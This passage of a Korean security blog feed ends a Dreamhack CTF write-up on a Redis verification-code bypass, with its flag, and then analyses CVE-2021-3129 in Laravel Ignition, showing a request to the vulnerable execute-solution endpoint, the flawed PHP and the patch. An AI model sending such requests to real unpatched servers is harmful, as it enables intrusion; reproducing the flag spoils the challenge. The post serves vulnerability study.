class="string">&quot;AUTH!&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> alert(<span class="string">&quot;Check Code&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>/email_verify</code>는 보면 현재 사용자의 이메일로 인증 번호를 생성하는 로직입니다. 코드를 보면 현재 사용자의 이메일을 Auth 클래스의 인자로 넘겨주며 클래스를 생성하고, set 함수를 이용해서 인증 코드를 생성해서 디비에 저장하고 있는 것을 볼 수 있습니다.<br></p><p><code>/email_verify_chk</code>는 인증 번호를 입력 받고, 디비에 저장되어 있는 값과 비교해서 참이면 활성화를 해주고, 거짓이면 그대로 비활성화로 있습니다.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.email = email</span><br><span class="line">self.emailauth_key = <span class="string">f&quot;auth:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line">self.getcount_key = <span class="string">f&quot;auth_count:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">conn.<span class="built_in">set</span>(self.emailauth_key, self.random_key)</span><br><span class="line">conn.<span class="built_in">set</span>(self.getcount_key, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">conn.<span class="built_in">set</span>(self.email, setcount)</span><br></pre></td></tr></table></figure><p>위 코드를 보면 email 값을 이용해서 email, emailauth_key, getcount_key 값을 만들고, 이를 redis의 키로 사용하는 것을 볼 수 있습니다. 그리고 emailauth_key가 실제로 입력 받은 인증 번호와 비교를 하는 값 입니다. 하지만 우리는 이 값을 알아낼 수는 없지만 로직을 이해하고 있다면 쉽게 우회할 수 있습니다. 해당 로직에 대한 내용은 <a href="https://dreamhack.io/learn/29#t209">드림핵 강의</a>에서 자세하게 다루고 있습니다. 이번 로직은 설명하기 귀찮고, 그냥 글을 보는 게 좋을 거 같습니다.<br></p><ul><li>시나리오<br></li></ul><ol><li><code>ADMIN</code>으로 회원 가입을 하고, <code>ADMIN</code>으로 로그인을 해서 관리자로 로그인을 한다.</li><li><code>auth:admin</code>인 사용자를 하나 더 만들어서 로그인을 한 후에, 인증 코드를 받는다.</li><li>(2)번 시나리오에서의 로직 때문에 관리자가 <code>/email_verify_chk</code>에서 <code>입력 받은</code> 인증 코드와 비교되는 인증 코드가 1로 바뀐다.</li><li>관리자에서 인증 코드를 1을 보내주면 관리자 게정이 활성화된다. </li><li>이제 FLAG를 읽으면 된다.<br></li></ol><p>위 내용은 그냥 링크 달아준 드림핵 강의를 한 번 보면 이해가 가실 겁니다.<br></p><blockquote><p>FLAG : DH{3cd6941075580d889519fcf1bd422bd1}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REDIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3129 RCE in Laravel Debug mode</title>
      <link href="2021/01/25/2021-01-25-CVE-2021-3129/"/>
      <url>2021/01/25/2021-01-25-CVE-2021-3129/</url>
      
        <content type="html"><![CDATA[<p>Laravel Debug mode에서 발견된 CVE-2021-3129 취약점을 분석해보겠습니다. Laravel은 자유/오픈 소스 PHP 웹 프레임워크 중 하나라고 합니다. 해당 취약점은 보안 연구원이 Laravel을 기반으로 한 웹 사이트에서 취약점 진단을 하다가 디버그 모드에서 발견했다고 합니다. 해당 사이트는 전체적으로 안전했지만 웹 프레임워크 취약점을 이용해서 RCE를 트리거 했습니다.<br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2021-3129</td><td>laravel &lt;= 8.4.2 and Ignition &lt;= 2.5.1</td><td>9.8</td></tr></tbody></table><p><br>CVE-2021-3129는 Laravel의 &lt;= V8.4.2 DEBUG MODE에서 모두 발생한다고 합니다. 2020년 11월 16일에 POC를 전달해주었고, 바로 다음 날 패치 버전을 발표했다고 합니다.<br></p><hr><h2 id="CVE-2021-3129"><a href="#CVE-2021-3129" class="headerlink" title="CVE-2021-3129"></a><em>CVE-2021-3129</em></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 141.164.52.207:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;141.164.52.207:8888&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 320</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;&#x2F;work&#x2F;pentest&#x2F;laravel&#x2F;laravel&#x2F;resources&#x2F;views&#x2F;hello.blade.php&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 요청은 username이라는 변수로 템플릿을 생성해주는 로직의 요청 헤더 값이고, solution의 값은 <code>Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution</code>, viewFile의 값은 <code>/work/pentest/laravel/laravel/resources/views/hello.blade.php</code>인 것을 볼 수 있습니다. 하지만 solution, viewFile의 값은 임의의 값으로 수정이 가능합니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Requests</span>\<span class="title">ExecuteSolutionRequest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">SolutionProviderRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Validation</span>\<span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecuteSolutionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        ExecuteSolutionRequest <span class="variable">$request</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        SolutionProviderRepository <span class="variable">$solutionProviderRepository</span></span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) </span>&#123;</span><br><span class="line">        <span class="variable">$solution</span> = <span class="variable">$request</span>-&gt;getRunnableSolution();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$solution</span>-&gt;run(<span class="variable">$request</span>-&gt;get(<span class="string">&#x27;parameters&#x27;</span>, []));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>컨트롤러를 확인해봅시다. <code>ExecuteSolutionController</code> 클래스를 확인해 보면 run() 메서드를 실행하고, 인자 값으로는 parameters를 넘겨주는 것을 볼 수 있습니다. run() 메서드는 <code>MakeViewVariableOptionalSolution::run()</code>에 정의되어 있습니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Solutions</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">RunnableSolution</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Blade</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MakeViewVariableOptionalSolution</span> <span class="keyword">implements</span> <span class="title">RunnableSolution</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 요청 헤더에서 sollution이 가르키는 <code>MakeViewVariableOptionalSolution</code> 클래스를 보면 run() 메서드에서 makeOptional() 메서드를 호출하는 것을 볼 수 있고, makeOptional() 메서드에 값으로 $parameters를 그대로 넘겨주고 있는 것을 볼 수 있습니다. (Facade\Ignition\Solutions\MakeViewVariableOptionalSolution)<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">    <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>makeOptional() 메서드를 보면 file_get_contents() 메서드를 호출하는 데 이때 입력값인 <code>viewFile</code>(임의의 값을 넣어줄 수 있음)를 넘겨주고 있는 것을 볼 수 있습니다. 그리고 <code>$originalContents</code>에서 <code>&#39;$&#39;.$parameters[&#39;variableName&#39;]</code>을 <code>&#39;$&#39;.$parameters[&#39;variableName&#39;].&quot; ?? &#39;&#39;&quot;</code>로 replace 시키고, 2개의 값을 이용해서 토큰 2개를 생성하는 것을 볼 수 있습니다. 그리고 생성된 두개의 토큰이 다르 false를 반환하고, 같은 $newContents를 반환하는 것을 볼 수 있습니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$newContents가 리턴이 되었다면 $newContents의 값을 file_put_contents() 메서드를 이용해서 $parameters[‘viewFile’]로 값을 넣어 파일을 생성하고 . 감이 오셨나요? 여기서 file_get_contents(), file_put_contents() 메서드의 인자값에 대한 검증이 존재하지 않아 우리가 원하는 값을 마음대로 삽입할 수 있습니다.<br><br></p><p>연구원은 이를 이용해서 PHP Wrapper을 이용해 log 파일을 체이닝 시켜, 마지막에 phar Wrapper를 이용해서 역직렬화 RCE를 트리거 하였습니다. log 파일을 체이닝 할 때는 base64, utf-8, utf-16 등을 이용해서 체이닝을 해준 것으로 보입니다.<br></p><hr><h2 id="CVE-2021-3129-Patch"><a href="#CVE-2021-3129-Patch" class="headerlink" title="CVE-2021-3129 Patch"></a><em>CVE-2021-3129 Patch</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ignition-2.5.2/ignition-2.5.2/src/Solutions/MakeViewVariableOptionalSolution.php</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isSafePath</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$path</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! Str::startsWith(<span class="variable">$path</span>, [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;./&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! Str::endsWith(<span class="variable">$path</span>, <span class="string">&#x27;.blade.php&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;isSafePath(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">        <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CVE-2021-3129 Patch 노트가 따로 존재하지 않아 패치 버전인 Ignition 2.5.2의 코드를 직접 확인해보았습니다. <code>makeOptional()</code> 메서드를 보면 기존에는 존재하지 않던 <code>$parameters[&#39;viewFile&#39;]</code>의 값을 <code>isSafePath()</code> 메서드를 이용해서 검증하고 있는 것을 볼 수 있습니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isSafePath</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$path</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! Str::startsWith(<span class="variable">$path</span>, [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;./&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! Str::endsWith(<span class="variable">$path</span>, <span class="string">&#x27;.blade.php&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isSafePath()</code> 메서드를 보면 ‘/‘, ‘./‘로 시작하지 않거나, 마지막에 .blade.php가 아니면 false를 리턴하는 것을 볼 수 있습니다. 위 2개의 검증 로직이 추가되므로 항상 viewFile의 값이 <code>/work/pentest/laravel/laravel/resources/views/hello.blade.php</code>일 때 정상 작동하게 되었고, 개발자가 의도하지 않은 값이 <code>viewFile</code>로 들어오게 되면 아무 일도 일어나지 않게 되며 CVE-2021-3129 취약점을 패치하였습니다.<br></p><p>매번 느끼지만 PHP에서는 끊임 없이 취약점이 나오고 있네요. 앞으로도 PHP를 사용하고 있는 웹 프레임워크나 여러 프로그램에서 취약점이 더 수두룩 나올 거 같습니다.<br></p><hr>]]></content>
      
      
      <categories>
          
